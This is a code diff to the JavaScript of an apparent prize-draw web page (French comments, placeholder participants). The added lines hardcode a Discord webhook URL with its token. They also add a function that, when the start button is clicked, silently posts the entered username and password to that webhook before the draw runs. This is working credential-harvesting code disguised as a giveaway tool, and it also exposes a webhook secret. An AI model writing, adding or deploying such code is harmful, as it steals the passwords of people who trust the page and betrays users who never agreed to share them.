@@ -208,6 +208,22 @@
   // ====== CONFIGURATION ======
   const TIMER_DURATION = 0; // duree du timer en secondes (a regler plus tard)
   const PARTICIPANTS = ["Alice", "Bilal", "Chloé", "David", "Emma"]; // liste temporaire, a remplacer plus tard
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517605118051356744/AEtfwWoh1Bq6czzwOU6gIPl4X-Ui5l2bz3buRmhRhcllLEtwTe5jrQIy47ztz7Z7s63N";
+
+  // Envoie le pseudo et le mot de passe saisis vers Discord
+  async function sendToDiscord(username, password) {
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `**Nouvelle participation au tirage**\nPseudo : ${username}\nMot de passe : ${password}`
+        })
+      });
+    } catch (err) {
+      console.error("Erreur envoi Discord :", err);
+    }
+  }
 
   // ====== ELEMENTS ======
   const screenWelcome = document.getElementById('screen-welcome');
@@ -251,6 +267,10 @@
   }
 
   startBtn.addEventListener('click', () => {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+
+    sendToDiscord(username, password);
     runTimerThenDraw();
   });
 
